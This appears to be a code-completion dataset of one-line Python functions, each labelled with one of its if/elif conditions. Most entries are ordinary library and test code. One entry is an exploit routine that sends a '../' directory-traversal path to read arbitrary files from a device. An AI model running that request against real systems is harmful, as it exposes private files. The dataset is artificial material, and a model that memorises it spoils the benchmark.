{"input": "def prepare_text(text, style): body = [] for fragment, sty in parse_tags(text, style, subs.styles): fragment = fragment.replace(r\"\\h\", \" \") fragment = fragment.replace(r\"\\n\", \"\\n\") fragment = fragment.replace(r\"\\N\", \"\\n\") if sty.italic: fragment = \"<i>%s</i>\" % fragment if sty.underline: fragment = \"<u>%s</u>\" % fragment if sty.strikeout: fragment = \"<s>%s</s>\" % fragment if sty.drawing: raise ContentNotUsable body.append(fragment) return re.sub(\"\\n+\", \"\\n\", \"\".join(body).strip())", "label": "if sty . drawing :"}
{"input": "def decref(self, key, count=1): with self._lock: slot = self._dict[key] if slot[1] < count: del self._dict[key] else: slot[1] -= count self._dict[key] = slot", "label": "if slot [ 1 ] < count :"}
{"input": "def stale_rec(node, nodes): if node.abspath() in node.ctx.env[Build.CFG_FILES]: return if getattr(node, \"children\", []): for x in node.children.values(): if x.name != \"c4che\": stale_rec(x, nodes) else: for ext in DYNAMIC_EXT: if node.name.endswith(ext): break else: if not node in nodes: if can_delete(node): Logs.warn(\"Removing stale file -> %r\", node) node.delete()", "label": "if node . name . endswith ( ext ) :"}
{"input": "def _do_ssl_handshake(self): try: self.socket.do_handshake() except ssl.SSLError as err: if err.args[0] in (ssl.SSL_ERROR_WANT_READ, ssl.SSL_ERROR_WANT_WRITE): return elif err.args[0] == ssl.SSL_ERROR_EOF: return self.handle_close() raise except OSError as err: if err.args[0] == errno.ECONNABORTED: return self.handle_close() else: self._ssl_accepting = False", "label": "if err . args [ 0 ] == errno . ECONNABORTED :"}
{"input": "def test_full_hd_tv(self): cur_test = \"full_hd_tv\" cur_qual = common.Quality.FULLHDTV for name, tests in iteritems(self.test_cases): for test in tests: if name == cur_test: self.assertEqual(cur_qual, common.Quality.name_quality(test)) else: self.assertNotEqual(cur_qual, common.Quality.name_quality(test))", "label": "if name == cur_test :"}
{"input": "def debug_tree(tree): l = [] for elt in tree: if isinstance(elt, int): l.append(_names.get(elt, elt)) elif isinstance(elt, str): l.append(elt) else: l.append(debug_tree(elt)) return l", "label": "elif isinstance ( elt , str ) :"}
{"input": "def get_all_missing_headers(self): # Heavy operation done in one optimized shot for chunk_height, expected_hash in reversed(list(self.checkpoints.items())): if chunk_height in self.known_missing_checkpointed_chunks: continue if self.chunk_hash(chunk_height, 1000) != expected_hash: self.known_missing_checkpointed_chunks.add(chunk_height) return self.known_missing_checkpointed_chunks", "label": "if self . chunk_hash ( chunk_height , 1000 ) != expected_hash :"}
{"input": "def get_byname(userId, documentName, session=None): if not session: session = db.Session ret = {} result = ( session.query(LegacyArchiveDocument) .filter_by(userId=userId, documentName=documentName) .first() ) if result: obj = dict( (key, value) for key, value in vars(result).items() if not key.startswith(\"_\") ) ret = obj return ret", "label": "if not key . startswith ( \"_\" )"}
{"input": "def cb(ipdb, msg, action): if action == \"RTM_NEWLINK\" and msg.get_attr(\"IFLA_IFNAME\", \"\") in (ifP1, ifP2): obj = ipdb.interfaces[msg[\"index\"]] if obj not in ipdb.interfaces[ifM]: ipdb.interfaces[ifM].add_port(obj) try: ipdb.interfaces[ifM].commit() except Exception: pass", "label": "if obj not in ipdb . interfaces [ ifM ] :"}
{"input": "def reorder_encoder_rules(self, nts): \"\"\"reorder rules so that any rules with ENCODER_PREFERRED is first\"\"\" for nt in nts.values(): first_rules = [] rest_of_the_rules = [] for r in nt.rules: if r.conditions.contains(\"ENCODER_PREFERRED\"): first_rules.append(r) else: rest_of_the_rules.append(r) nt.rules = first_rules + rest_of_the_rules", "label": "if r . conditions . contains ( \"ENCODER_PREFERRED\" ) :"}
{"input": "def update_url(self, s, keywords): pc = self w = pc.ensure_text_widget() pc.show() if 1: w.setPlainText(\"\") else: url = pc.get_url(s, \"@url\") if url: w.setPlainText(\"@url %s\" % url) else: w.setPlainText(\"@url: no url given\")", "label": "if url :"}
{"input": "def _update_engines(self, engines): \"\"\"Update our engines dict and _ids from a dict of the form: {id:uuid}.\"\"\" for k, v in iteritems(engines): eid = int(k) if eid not in self._engines: self._ids.append(eid) self._engines[eid] = v self._ids = sorted(self._ids) if ( sorted(self._engines.keys()) != list(range(len(self._engines))) and self._task_scheme == \"pure\" and self._task_socket ): self._stop_scheduling_tasks()", "label": "if eid not in self . _engines :"}
{"input": "def test_delete_chat_thread(self): async with self.chat_client: await self._create_thread() await self.chat_client.delete_chat_thread(self.thread_id) # delete created users and chat threads if not self.is_playback(): await self.chat_client.delete_chat_thread(self.thread_id)", "label": "if not self . is_playback ( ) :"}
{"input": "def _to_protobuf_matrix(matrix, p_matrix, transformation=None): for row in matrix: p_row = p_matrix.rows.add() for cell in row: value = cell if transformation: value = transformation(value) p_row.cells.append(value)", "label": "if transformation :"}
{"input": "def apply(self, db, family): if self.rtype: if self.rtype.is_custom() and self.use_regex: if self.regex[0].search(str(family.get_relationship())) is None: return False elif self.rtype != family.get_relationship(): return False return True", "label": "if self . rtype . is_custom ( ) and self . use_regex :"}
{"input": "def get_somatic_variantcallers(items): \"\"\"Retrieve all variant callers for somatic calling, handling somatic/germline.\"\"\" out = [] for data in items: vcs = dd.get_variantcaller(data) if isinstance(vcs, dict) and \"somatic\" in vcs: vcs = vcs[\"somatic\"] if not isinstance(vcs, (list, tuple)): vcs = [vcs] out += vcs return set(vcs)", "label": "if isinstance ( vcs , dict ) and \"somatic\" in vcs :"}
{"input": "def balancer_list_members(self, balancer): lb = self._get_balancer_model(balancer.id) members = [] vs = self._locate_service_group(lb, balancer.port) if vs: if vs[\"serviceGroups\"]: srvgrp = vs[\"serviceGroups\"][0] members = [self._to_member(srv, balancer) for srv in srvgrp[\"services\"]] return members", "label": "if vs [ \"serviceGroups\" ] :"}
{"input": "def https_open(self, req): try: return self.do_open(do_connection, req) except Exception as err_msg: try: error_msg = str(err_msg.args[0]).split(\"] \")[1] + \".\" except IndexError: error_msg = str(err_msg.args[0]) + \".\" if settings.INIT_TEST == True: if settings.VERBOSITY_LEVEL < 2: print(settings.FAIL_STATUS) else: if settings.VERBOSITY_LEVEL < 1: print(\"\") print(settings.print_critical_msg(error_msg)) raise SystemExit()", "label": "if settings . INIT_TEST == True :"}
{"input": "def add_libdirs(self, envvar, sep, fatal=False): v = os.environ.get(envvar) if not v: return for dir in str.split(v, sep): dir = str.strip(dir) if not dir: continue dir = os.path.normpath(dir) if os.path.isdir(dir): if not dir in self.library_dirs: self.library_dirs.append(dir) elif fatal: fail(\"FATAL: bad directory %s in environment variable %s\" % (dir, envvar))", "label": "if not dir in self . library_dirs :"}
{"input": "def check_placement_group_index(placement_group: PlacementGroup, bundle_index: int): assert placement_group is not None if placement_group.id.is_nil(): if bundle_index != -1: raise ValueError( \"If placement group is not set, \" \"the value of bundle index must be -1.\" ) elif bundle_index >= placement_group.bundle_count or bundle_index < -1: raise ValueError( f\"placement group bundle index {bundle_index} \" f\"is invalid. Valid placement group indexes: \" f\"0-{placement_group.bundle_count}\" )", "label": "if bundle_index != - 1 :"}
{"input": "def incoming(): while True: m = ws.receive() if m is not None: m = str(m) print((m, len(m))) if len(m) == 35: ws.close() break else: break print((\"Connection closed!\",))", "label": "if len ( m ) == 35 :"}
{"input": "def walk_tree( root: Element, processor: Callable[[Element], Optional[_T]], stop_after_first: bool = False, ) -> List[_T]: results = [] queue = deque([root]) while queue: currElement = queue.popleft() for child in currElement: if child: queue.append(child) result = processor(child) if result is not None: results.append(result) if stop_after_first: return results return results", "label": "if stop_after_first :"}
{"input": "def _find_node_with_predicate(self, node, predicate): if node != self._tree._root and predicate(node): return node item, cookie = self._tree.GetFirstChild(node) while item: if predicate(item): return item if self._tree.ItemHasChildren(item): result = self._find_node_with_predicate(item, predicate) if result: return result item, cookie = self._tree.GetNextChild(node, cookie) return None", "label": "if predicate ( item ) :"}
{"input": "def traverse_coords(coords, dst_coords): for p in coords: if type(p[0]) is list: lst = [] traverse_coords(p, lst) dst_coords.append(lst) else: x, y = p[0], p[1] d = (x + (y - b) * m) / (1 + m * m) x2 = 2 * d - x y2 = 2 * d * m - y + 2 * b dst_coords.append((x2, y2)) return dst_coords", "label": "if type ( p [ 0 ] ) is list :"}
{"input": "def normalize_replies(self, x): xs = x.split(\"\\n\") xs2 = [] for x in xs: if \"your persona:\" in x: # Normalize the sentence appearing after 'your persona:' x = x[len(\"your persona: \") :] x = normalize_reply(x) x = \"your persona: \" + x else: x = normalize_reply(x) xs2.append(x) return \"\\n\".join(xs2)", "label": "if \"your persona:\" in x :"}
{"input": "def run_unittest(*classes): suite = unittest.TestSuite() for c in classes: if isinstance(c, str): c = __import__(c) for name in dir(c): obj = getattr(c, name) if isinstance(obj, type) and issubclass(obj, unittest.TestCase): suite.addTest(obj) else: suite.addTest(c) runner = unittest.TestRunner() result = runner.run(suite)", "label": "if isinstance ( c , str ) :"}
{"input": "def bprop_naive(self, error, permute=False): for dst in range(self.ofmsize): rflinks = self.links[dst] A = error[:, self.ofmlocs[dst]] B = self.weights if permute: inds = np.random.permutation(A.shape[1]) np.dot(A[:, inds], B[inds, :], self.bpropbuf) else: np.dot(A, B, self.bpropbuf) self.berror[:, rflinks] += self.bpropbuf", "label": "if permute :"}
{"input": "def rewrite_order_lookup_key(model, lookup_key): try: if lookup_key.startswith(\"-\"): return \"-\" + rewrite_lookup_key(model, lookup_key[1:]) else: return rewrite_lookup_key(model, lookup_key) except AttributeError: return lookup_key", "label": "if lookup_key . startswith ( \"-\" ) :"}
{"input": "def test_default_configuration(self): transformations = [] for i in range(2): transformation, original = self._test_helper(RescalingChoice, dataset=\"boston\") # The maximum is around 1.95 for the transformed array... self.assertAlmostEqual(np.mean(transformation), 0, places=5) self.assertAlmostEqual(np.std(transformation), 1, places=5) self.assertFalse((original == transformation).all()) transformations.append(transformation) if len(transformations) > 1: self.assertTrue((transformations[-1] == transformations[-2]).all())", "label": "if len ( transformations ) > 1 :"}
{"input": "def test_get_filter_text(self): with realized(self.b): if self.b.can_filter_text(): self.assertEqual(self.b.get_filter_text(), u\"\") self.assertTrue(isinstance(self.b.get_filter_text(), str)) self.b.filter_text(u\"foo\") self.assertEqual(self.b.get_filter_text(), u\"foo\") self.assertTrue(isinstance(self.b.get_filter_text(), str))", "label": "if self . b . can_filter_text ( ) :"}
{"input": "def _namelist(instance): namelist, namedict, classlist = [], {}, [instance.__class__] for c in classlist: for b in c.__bases__: classlist.append(b) for name in c.__dict__.keys(): if not namedict.has_key(name): namelist.append(name) namedict[name] = 1 return namelist", "label": "if not namedict . has_key ( name ) :"}
{"input": "def resolve_cloudtrail_payload(self, payload): sources = self.data.get(\"sources\", []) events = [] for e in self.data.get(\"events\"): if not isinstance(e, dict): events.append(e) event_info = CloudWatchEvents.get(e) if event_info is None: continue else: event_info = e events.append(e[\"event\"]) sources.append(event_info[\"source\"]) payload[\"detail\"] = {\"eventSource\": list(set(sources)), \"eventName\": events}", "label": "if event_info is None :"}
{"input": "def __setitem__(self, aset, c): if isinstance(aset, tuple): if isinstance(aset[0], str): row = self.rownames.index(aset[0]) else: row = aset[0] if isinstance(aset[1], str): column = self.colnames.index(aset[1]) else: column = aset[1] self.cell_value(row, column, c) else: Matrix.__setitem__(self, aset, c)", "label": "if isinstance ( aset [ 0 ] , str ) :"}
{"input": "def test_retrieve_robots_token_permission( username, is_admin, with_permissions, app, client ): with client_with_identity(username, client) as cl: params = {\"orgname\": \"buynlarge\", \"token\": \"true\"} if with_permissions: params[\"permissions\"] = \"true\" result = conduct_api_call(cl, OrgRobotList, \"GET\", params, None) assert result.json[\"robots\"] for robot in result.json[\"robots\"]: assert (robot.get(\"token\") is not None) == is_admin assert (robot.get(\"repositories\") is not None) == ( is_admin and with_permissions )", "label": "if with_permissions :"}
{"input": "def _analyze_ast(contents): try: return ast.literal_eval(contents) except SyntaxError: pass try: # remove all comments contents = re.sub(re.compile(r\"/\\*.*?\\*/\", re.DOTALL), \"\", contents) contents = re.sub(re.compile(r\"#.*?\\n\"), \"\", contents) # remove anything before dict declaration like: \"caps = { ...\" match = re.match(r\"^([^{]+)\", contents) if match: contents = contents.replace(match.group(1), \"\") # and try again return ast.literal_eval(contents) except SyntaxError: pass return False", "label": "if match :"}
{"input": "def bulk_disable_accounts(account_names): \"\"\"Bulk disable accounts\"\"\" for account_name in account_names: account = Account.query.filter(Account.name == account_name).first() if account: app.logger.debug(\"Disabling account %s\", account.name) account.active = False db.session.add(account) db.session.commit() db.session.close()", "label": "if account :"}
{"input": "def _add_agent_rewards(self, reward_dict: Dict[AgentID, float]) -> None: for agent_id, reward in reward_dict.items(): if reward is not None: self.agent_rewards[agent_id, self.policy_for(agent_id)] += reward self.total_reward += reward self._agent_reward_history[agent_id].append(reward)", "label": "if reward is not None :"}
{"input": "def wrapper(strategy, backend, pipeline_index, *args, **kwargs): current_partial = partial_prepare( strategy, backend, pipeline_index, *args, **kwargs ) out = ( func( strategy=strategy, backend=backend, pipeline_index=pipeline_index, current_partial=current_partial, *args, **kwargs ) or {} ) if not isinstance(out, dict): strategy.storage.partial.store(current_partial) if save_to_session: strategy.session_set(PARTIAL_TOKEN_SESSION_NAME, current_partial.token) return out", "label": "if save_to_session :"}
{"input": "def restore_text(self): if self.source_is_console(): cb = self._last_console_cb else: cb = self._last_editor_cb if cb is None: if self.is_plain_text_mode(): self.plain_text.clear() else: self.rich_text.clear() else: func = cb[0] args = cb[1:] func(*args) if get_meth_class_inst(func) is self.rich_text: self.switch_to_rich_text() else: self.switch_to_plain_text()", "label": "if self . is_plain_text_mode ( ) :"}
{"input": "def extract_groups(self, text: str, language_code: str): previous = None group = 1 groups = [] words = [] ignored = IGNORES.get(language_code, {}) for word in NON_WORD.split(text): if not word: continue if word not in ignored and len(word) >= 2: if previous == word: group += 1 elif group > 1: groups.append(group) words.append(previous) group = 1 previous = word if group > 1: groups.append(group) words.append(previous) return groups, words", "label": "if previous == word :"}
{"input": "def pendingcalls_thread(self, context): try: self.pendingcalls_submit(context.l, context.n) finally: with context.lock: context.nFinished += 1 nFinished = context.nFinished if False and support.verbose: print(\"finished threads: \", nFinished) if nFinished == context.nThreads: context.event.set()", "label": "if nFinished == context . nThreads :"}
{"input": "def __getattr__(self, item: str) -> Any: if hasattr(MissingPandasLikeRolling, item): property_or_func = getattr(MissingPandasLikeRolling, item) if isinstance(property_or_func, property): return property_or_func.fget(self) # type: ignore else: return partial(property_or_func, self) raise AttributeError(item)", "label": "if isinstance ( property_or_func , property ) :"}
{"input": "def _csv(self, match=None, dump=None): if dump is None: dump = self._dump(match) for record in dump: row = [] for field in record: if isinstance(field, int): row.append(\"%i\" % field) elif field is None: row.append(\"\") else: row.append(\"'%s'\" % field) yield \",\".join(row)", "label": "elif field is None :"}
{"input": "def get_default_dict(section_definition): section_key = section_definition.get(\"key\") if section_key == \"global\": section_key += \"_\" if \"cluster\" == section_key: section_key += ( \"_sit\" if section_definition.get(\"cluster_model\") == ClusterModel.SIT.name else \"_hit\" ) default_dict = DefaultDict[section_key].value return default_dict", "label": "if section_definition . get ( \"cluster_model\" ) == ClusterModel . SIT . name"}
{"input": "def scan_resource_conf(self, conf): subscription = re.compile(r\"\\/|\\/subscriptions\\/[\\w\\d-]+$|\\[subscription\\(\\).id\\]\") if \"properties\" in conf: if \"assignableScopes\" in conf[\"properties\"]: if any( re.match(subscription, scope) for scope in conf[\"properties\"][\"assignableScopes\"] ): if \"permissions\" in conf[\"properties\"]: if conf[\"properties\"][\"permissions\"]: for permission in conf[\"properties\"][\"permissions\"]: if \"actions\" in permission and \"*\" in permission[\"actions\"]: return CheckResult.FAILED return CheckResult.PASSED", "label": "if \"assignableScopes\" in conf [ \"properties\" ] :"}
{"input": "def hard_update(self, cache, size_change, pins_gates): \"\"\"replace verts, rads and vel (in NumPy)\"\"\" verts, rads, vel, react = cache if len(verts) == self.v_len: if pins_gates[0] and pins_gates[1]: unpinned = self.params[\"unpinned\"] self.verts[unpinned] = verts[unpinned] else: self.verts = verts self.vel = vel if not size_change: self.rads = rads", "label": "if not size_change :"}
{"input": "def run(self): if self.check(): path = \"/../../../../../../../../../../../..{}\".format(self.filename) response = self.http_request(method=\"GET\", path=path) if response is None: return if response.status_code == 200 and response.text: print_success(\"Success! File: %s\" % self.filename) print_info(response.text) else: print_error(\"Exploit failed\") else: print_error(\"Device seems to be not vulnerable\")", "label": "if response . status_code == 200 and response . text :"}
{"input": "def write_text(self, text): \"\"\"Writes re-indented text into the buffer.\"\"\" should_indent = False rows = [] for row in text.split(\"\\n\"): if should_indent: row = \" {}\".format(row) if \"\\b\" in row: row = row.replace(\"\\b\", \"\", 1) should_indent = True elif not len(row.strip()): should_indent = False rows.append(row) self.write(\"{}\\n\".format(\"\\n\".join(rows)))", "label": "elif not len ( row . strip ( ) ) :"}
{"input": "def default_logger(): \"\"\"A logger used to output seed information to nosetests logs.\"\"\" logger = logging.getLogger(__name__) # getLogger() lookups will return the same logger, but only add the handler once. if not len(logger.handlers): handler = logging.StreamHandler(sys.stderr) handler.setFormatter(logging.Formatter(\"[%(levelname)s] %(message)s\")) logger.addHandler(handler) if logger.getEffectiveLevel() == logging.NOTSET: logger.setLevel(logging.INFO) return logger", "label": "if logger . getEffectiveLevel ( ) == logging . NOTSET :"}
{"input": "def while1_test(a, b, c): while 1: if a != 2: if b: a = 3 b = 0 elif c: c = 0 else: a += b + c break return a, b, c", "label": "elif c :"}
{"input": "def fetch(): retval = {} content = retrieve_content(__url__) if __check__ in content: for line in content.split(\"\\n\"): line = line.strip() if not line or line.startswith(\"#\") or \".\" not in line: continue if \" # \" in line: reason = line.split(\" # \")[1].split()[0].lower() if reason == \"scanning\": # too many false positives continue retval[line.split(\" # \")[0]] = (__info__, __reference__) return retval", "label": "if reason == \"scanning\" :"}
{"input": "def create_order(order, shopify_settings, old_order_sync=False, company=None): so = create_sales_order(order, shopify_settings, company) if so: if order.get(\"financial_status\") == \"paid\": create_sales_invoice( order, shopify_settings, so, old_order_sync=old_order_sync ) if order.get(\"fulfillments\") and not old_order_sync: create_delivery_note(order, shopify_settings, so)", "label": "if order . get ( \"financial_status\" ) == \"paid\" :"}
{"input": "def __getitem__(self, key): if isinstance(key, numbers.Number): l = len(self) if key >= l: raise IndexError(\"Index %s out of range (%s elements)\" % (key, l)) if key < 0: if key < -l: raise IndexError(\"Index %s out of range (%s elements)\" % (key, l)) key += l return self(key + 1) elif isinstance(key, slice): raise ValueError( self.impl.__class__.__name__ + \" object does not support slicing\" ) else: return self(key)", "label": "if key < 0 :"}
{"input": "def load_checks(path=None, subpkg=\"\"): \"\"\"Dynamically import all check modules for the side effect of registering checks.\"\"\" if path is None: path = os.path.dirname(__file__) modules = [] for name in os.listdir(path): if os.path.isdir(os.path.join(path, name)): modules = modules + load_checks( os.path.join(path, name), subpkg + \".\" + name ) continue if name.endswith(\".py\") and name not in LOADER_EXCLUDES: modules.append(import_module(__package__ + subpkg + \".\" + name[:-3])) return modules", "label": "if name . endswith ( \".py\" ) and name not in LOADER_EXCLUDES :"}
{"input": "def _remove_temporary_files(self, temporary_files): \"\"\"Internal function for cleaning temporary files\"\"\" for file_object in temporary_files: file_name = file_object.name file_object.close() if os.path.exists(file_name): os.remove(file_name) arff_file_name = file_name + \".arff\" if os.path.exists(arff_file_name): os.remove(arff_file_name)", "label": "if os . path . exists ( arff_file_name ) :"}
{"input": "def search_rotate(array, val): low, high = 0, len(array) - 1 while low <= high: mid = (low + high) // 2 if val == array[mid]: return mid if array[low] <= array[mid]: if array[low] <= val <= array[mid]: high = mid - 1 else: low = mid + 1 else: if array[mid] <= val <= array[high]: low = mid + 1 else: high = mid - 1 return -1", "label": "if array [ mid ] <= val <= array [ high ] :"}
{"input": "def match_file(self, file, tff_format): match = tff_format.search(file.filename.replace(\"\\\\\", \"/\")) if match: result = {} for name, value in match.groupdict().items(): value = value.strip() if name in self.numeric_tags: value = value.lstrip(\"0\") if self.ui.replace_underscores.isChecked(): value = value.replace(\"_\", \" \") result[name] = value return result else: return {}", "label": "if self . ui . replace_underscores . isChecked ( ) :"}
{"input": "def exclude_pkgs(self, pkgs): # :api name = \"excludepkgs\" if pkgs is not None and pkgs != []: if self._has_option(name): self._set_value(name, pkgs, dnf.conf.PRIO_COMMANDLINE) else: logger.warning( _(\"Unknown configuration option: %s = %s\"), ucd(name), ucd(pkgs) )", "label": "if self . _has_option ( name ) :"}
{"input": "def button_press_cb(self, tdw, event): if self.zone in (_EditZone.CREATE_AXIS, _EditZone.DELETE_AXIS): button = event.button if button == 1 and event.type == Gdk.EventType.BUTTON_PRESS: self._click_info = (button, self.zone) return False return super(SymmetryEditMode, self).button_press_cb(tdw, event)", "label": "if button == 1 and event . type == Gdk . EventType . BUTTON_PRESS :"}
{"input": "def declare_var( self, type_name: Union[str, Tuple[str, str]], *, var_name: str = \"\", var_name_prefix: str = \"v\", shared: bool = False, ) -> str: if shared: if not var_name: var_name = var_name_prefix if var_name not in self.shared_vars: self.declarations.append((var_name, type_name)) self.shared_vars.add(var_name) else: if not var_name: var_name = self.get_var_name(var_name_prefix) self.declarations.append((var_name, type_name)) return var_name", "label": "if not var_name :"}
{"input": "def get_module_map(module, module_path): \"\"\"Map true modules to exported name\"\"\" if not module_is_public(module): return {} m = {} for symbol_name in dir(module): if symbol_name.startswith(\"_\"): continue symbol = getattr(module, symbol_name) symbol_path = \"%s.%s\" % (module_path, symbol_name) m[symbol] = symbol_path if inspect.ismodule(symbol): m.update(get_module_map(symbol, symbol_path)) return m", "label": "if inspect . ismodule ( symbol ) :"}
{"input": "def build_properties(self): self.properties = set() if self.module.partial_scan == True: # For partial scans, only check the most common properties values for prop in self.COMMON_PROPERTIES: self.properties.add(chr(prop)) else: for pb in range(0, 9): for lp in range(0, 5): for lc in range(0, 5): prop = self.build_property(pb, lp, lc) if prop is not None: self.properties.add(chr(prop))", "label": "if prop is not None :"}
{"input": "def getFileIdFromAlternateLink(altLink): loc = altLink.find(\"/d/\") if loc > 0: fileId = altLink[loc + 3 :] loc = fileId.find(\"/\") if loc != -1: return fileId[:loc] else: loc = altLink.find(\"/folderview?id=\") if loc > 0: fileId = altLink[loc + 15 :] loc = fileId.find(\"&\") if loc != -1: return fileId[:loc] controlflow.system_error_exit( 2, f\"{altLink} is not a valid Drive File alternateLink\" )", "label": "if loc > 0 :"}
{"input": "def _coerce_trials_data(data, path): if not isinstance(data, list): if not isinstance(data, dict): raise BatchFileError( path, \"invalid data type for trials: expected list or dict\" \", got %s\" % type(data).__name__, ) data = [data] for item in data: if not isinstance(item, dict): raise BatchFileError( path, \"invalid data type for trial %r: expected dict\" % item ) return data", "label": "if not isinstance ( item , dict ) :"}
{"input": "def remove(self, *objs): val = getattr(self.instance, attname) for obj in objs: # Is obj actually part of this descriptor set? if getattr(obj, rel_field.attname) == val: setattr(obj, rel_field.name, None) obj.save() else: raise rel_field.rel.to.DoesNotExist( \"%r is not related to %r.\" % (obj, self.instance) )", "label": "if getattr ( obj , rel_field . attname ) == val :"}
{"input": "def run(self): try: if not self.shell: self.shell = os.name == \"nt\" if self.working_dir != \"\": os.chdir(self.working_dir) proc = subprocess.Popen( self.command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=self.shell, env=self.env, ) output = codecs.decode(proc.communicate()[0]) self.on_done(output) except subprocess.CalledProcessError as e: self.on_done(e.returncode, error=True) except OSError as e: self.on_done(e.message, error=True)", "label": "if not self . shell :"}
{"input": "def filter_testsuite(suite, matcher, level=None): \"\"\"Returns a flattened list of test cases that match the given matcher.\"\"\" if not isinstance(suite, unittest.TestSuite): raise TypeError(\"not a TestSuite\", suite) results = [] for test in suite._tests: if level is not None and getattr(test, \"level\", 0) > level: continue if isinstance(test, unittest.TestCase): testname = test.id() # package.module.class.method if matcher(testname): results.append(test) else: filtered = filter_testsuite(test, matcher, level) results.extend(filtered) return results", "label": "if isinstance ( test , unittest . TestCase ) :"}
{"input": "def propagate_touch_to_touchable_widgets(self, touch, touch_event, *args): triggered = False for i in self._touchable_widgets: if i.collide_point(touch.x, touch.y): triggered = True if touch_event == \"down\": i.on_touch_down(touch) elif touch_event == \"move\": i.on_touch_move(touch, *args) elif touch_event == \"up\": i.on_touch_up(touch) return triggered", "label": "elif touch_event == \"up\" :"}
{"input": "def add_attributes(attributes, all_base64): lines = [] oc_attr = None # objectclass first, even if this is not specified in the RFC for attr in attributes: if attr.lower() == \"objectclass\": for val in attributes[attr]: lines.append(_convert_to_ldif(attr, val, all_base64)) oc_attr = attr break # remaining attributes for attr in attributes: if attr != oc_attr and attr in attributes: for val in attributes[attr]: lines.append(_convert_to_ldif(attr, val, all_base64)) return lines", "label": "if attr != oc_attr and attr in attributes :"}
{"input": "def split_quality(quality): anyQualities = [] bestQualities = [] for curQual in Quality.qualityStrings.keys(): if curQual & quality: anyQualities.append(curQual) if curQual << 16 & quality: bestQualities.append(curQual) return sorted(anyQualities), sorted(bestQualities)", "label": "if curQual & quality :"}
{"input": "def check(dbdef): \"database version must include required keys\" for vnum, vdef in dbdef.items(): missing = set(required) - set(vdef) if vnum == min(dbdef): missing -= set(initially_ok) if missing: yield vnum, missing", "label": "if missing :"}
{"input": "def teardown_func(): try: yield finally: \"tear down test fixtures\" cache = os.path.join(here, \"data\", \"cache.db\") if os.path.exists(cache): os.remove(cache)", "label": "if os . path . exists ( cache ) :"}
{"input": "def getCachedArt(albumid): from headphones import cache c = cache.Cache() artwork_path = c.get_artwork_from_cache(AlbumID=albumid) if not artwork_path: return if artwork_path.startswith(\"http://\"): artwork = request.request_content(artwork_path, timeout=20) if not artwork: logger.warn(\"Unable to open url: %s\", artwork_path) return else: with open(artwork_path, \"r\") as fp: return fp.read()", "label": "if not artwork :"}
{"input": "def delete_volume(self, name, reraise=False): try: self.k8s_api.delete_persistent_volume( name=name, body=client.V1DeleteOptions(api_version=constants.K8S_API_VERSION_V1), ) logger.debug(\"Volume `{}` Deleted\".format(name)) except ApiException as e: if reraise: raise PolyaxonK8SError(\"Connection error: %s\" % e) from e else: logger.debug(\"Volume `{}` was not found\".format(name))", "label": "if reraise :"}
{"input": "def _hashable(self): hashes = [self.graph.md5()] for g in self.geometry.values(): if hasattr(g, \"md5\"): hashes.append(g.md5()) elif hasattr(g, \"tostring\"): hashes.append(str(hash(g.tostring()))) else: # try to just straight up hash # this may raise errors hashes.append(str(hash(g))) hashable = \"\".join(sorted(hashes)).encode(\"utf-8\") return hashable", "label": "if hasattr ( g , \"md5\" ) :"}
{"input": "def get_history_data(self, guid, count=1): history = {} if count < 1: return history key = self._make_key(guid) for i in range(0, self.db.llen(key)): r = self.db.lindex(key, i) c = msgpack.unpackb(r) if c[\"tries\"] == 0 or c[\"tries\"] is None: if c[\"data\"] not in history: history[c[\"data\"]] = c[\"timestamp\"] if len(history) >= count: break return history", "label": "if c [ \"tries\" ] == 0 or c [ \"tries\" ] is None :"}
{"input": "def renderable_events(self, date, hour): \"Returns the number of renderable events\" renderable_events = [] for event in self.events: if event.covers(date, hour): renderable_events.append(event) if hour: for current in renderable_events: for event in self.events: if event not in renderable_events: for hour in range(self.start_hour, self.end_hour): if current.covers(date, hour) and event.covers(date, hour): renderable_events.append(event) break return renderable_events", "label": "if event . covers ( date , hour ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_module(d.getPrefixedString()) continue if tt == 18: self.set_version(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def _parseConfigFile(self, iniPath, createConfig=True): parser = SafeConfigParserUnicode(strict=False) if not os.path.isfile(iniPath): if createConfig: open(iniPath, \"w\").close() else: return parser.readfp(codecs.open(iniPath, \"r\", \"utf_8_sig\")) for section, options in list(self._iniStructure.items()): if parser.has_section(section): for option in options: if parser.has_option(section, option): self._config[option] = parser.get(section, option)", "label": "if parser . has_section ( section ) :"}
{"input": "def get_block_id_at_height(store, height, descendant_id): if height is None: return None while True: block = store._load_block(descendant_id) if block[\"height\"] == height: return descendant_id descendant_id = block[ \"search_id\" if util.get_search_height(block[\"height\"]) >= height else \"prev_id\" ]", "label": "if block [ \"height\" ] == height :"}
{"input": "def wait_services_ready(selectors, min_counts, count_fun, timeout=None): readies = [0] * len(selectors) start_time = time.time() while True: all_satisfy = True for idx, selector in enumerate(selectors): if readies[idx] < min_counts[idx]: all_satisfy = False readies[idx] = count_fun(selector) break if all_satisfy: break if timeout and timeout + start_time < time.time(): raise TimeoutError(\"Wait cluster start timeout\") time.sleep(1)", "label": "if timeout and timeout + start_time < time . time ( ) :"}
{"input": "def waitForNodes(self, expected, comparison=None, tag_filters={}): MAX_ITER = 50 for i in range(MAX_ITER): n = len(self.provider.non_terminated_nodes(tag_filters)) if comparison is None: comparison = self.assertEqual try: comparison(n, expected) return except Exception: if i == MAX_ITER - 1: raise time.sleep(0.1)", "label": "if i == MAX_ITER - 1 :"}
{"input": "def _api_snapshot_delete(self, drbd_rsc_name, snap_name): with lin_drv(self.default_uri) as lin: if not lin.connected: lin.connect() snap_reply = lin.snapshot_delete( rsc_name=drbd_rsc_name, snapshot_name=snap_name ) return snap_reply", "label": "if not lin . connected :"}
{"input": "def response(resp): results = [] search_results = loads(resp.text) # return empty array if there are no results if not search_results.get(\"query\", {}).get(\"search\"): return [] # parse results for result in search_results[\"query\"][\"search\"]: if result.get(\"snippet\", \"\").startswith(\"#REDIRECT\"): continue url = ( base_url.format(language=resp.search_params[\"language\"]) + \"wiki/\" + quote(result[\"title\"].replace(\" \", \"_\").encode(\"utf-8\")) ) # append result results.append({\"url\": url, \"title\": result[\"title\"], \"content\": \"\"}) # return results return results", "label": "if result . get ( \"snippet\" , \"\" ) . startswith ( \"#REDIRECT\" ) :"}
